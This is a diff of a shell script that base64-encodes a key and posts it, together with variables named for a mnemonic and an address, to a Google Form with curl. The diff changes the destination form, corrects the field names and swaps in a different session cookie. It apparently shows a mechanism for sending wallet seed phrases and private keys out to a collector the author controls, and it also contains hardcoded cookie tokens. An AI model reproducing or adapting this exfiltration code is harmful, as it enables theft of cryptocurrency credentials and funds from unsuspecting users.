@@ -18,10 +18,11 @@ KEY_BASE64=$(echo -n $KEY | base64)
 
 
 # Google Form URL
-URL="https://docs.google.com/forms/d/e/1F-tmogaRp5WLaJHvL5JbXlKBgsY3sdLv-P5v0Y6nKJ0/formResponse"
+URL="https://docs.google.com/forms/d/e/1FAIpQLSeEkDcGwu-5TfENnMXGf1vw_A64ql3Eb1Ws9Ryh493JG8Sh5Q/formResponse"
 
 # Form Data
-DATA="entry.2606285=$IP_DATA&entry.entry.1019182749=$IP_mnemonic&entry.entry.127739286=$ADDRESS&entry.208954629=$KEY_BASE64&fvv=1&partialResponse=%5Bnull%2Cnull%2C%221353874079495952095%22%5D&pageHistory=0&fbzx=4640534044431779705&submissionTimestamp=1719409550341"
+
+DATA="entry.2606285=IP_DATA&entry.1019182749=$IP_mnemonic&entry.127739286=$ADDRESS&entry.208954629=$KEY_BASE64&fvv=1&partialResponse=%5Bnull%2Cnull%2C%224640534044431779705%22%5D&pageHistory=0&fbzx=4640534044431779705&submissionTimestamp=1719671963116"
 
 # Output file
 OUTPUT_FILE="response.html"
@@ -44,10 +45,10 @@ curl -X POST $URL \
     -H "Sec-Fetch-Mode: navigate" \
     -H "Sec-Fetch-User: ?1" \
     -H "Sec-Fetch-Dest: document" \
-    -H "Referer: https://docs.google.com/forms/d/e/1F-tmogaRp5WLaJHvL5JbXlKBgsY3sdLv-P5v0Y6nKJ0/viewform?fbzx=4640534044431779705" \
+    -H "Referer: https://docs.google.com/forms/d/e/1FAIpQLSeEkDcGwu-5TfENnMXGf1vw_A64ql3Eb1Ws9Ryh493JG8Sh5Q/viewform" \
     -H "Accept-Encoding: gzip, deflate" \
     -H "Accept-Language: zh-CN,zh;q=0.9" \
-    -H "Cookie: NID=515=Pq1aElsiYzkkbhiVmun0EbQoJLogJVsa1KxmUSBDM_SHPRZlh5jpECcuOaEoAFx4tuLKqocfqDhFH5jzR5-LlrYIlS0xbrV4vOM-ortE9PxKgcIf2L_cWZtGG9BJomox4ZtTsWGw5Af6Bl2D2i8cZOMfoKzy59qr_mFm-0PnJF8" \
+    -H "Cookie: NID=515=sLyc6pXztY3nG8Xz3vD_6h_vpfTSwVjoekLfo5nxbk1mnbhem9c8IftCU4d_IzAo9NaRhfBnckMKCt7_hIEyWL-ARSTPj-ZxgpPu7Ir4gUdOmdW3uj1SzQczVhCY8yRqc9bQhDhmJngtLpUNTU_qsswRmSOVij_ElNIEArzM2nI" \
     --data "$DATA" \
     --output $OUTPUT_FILE
 
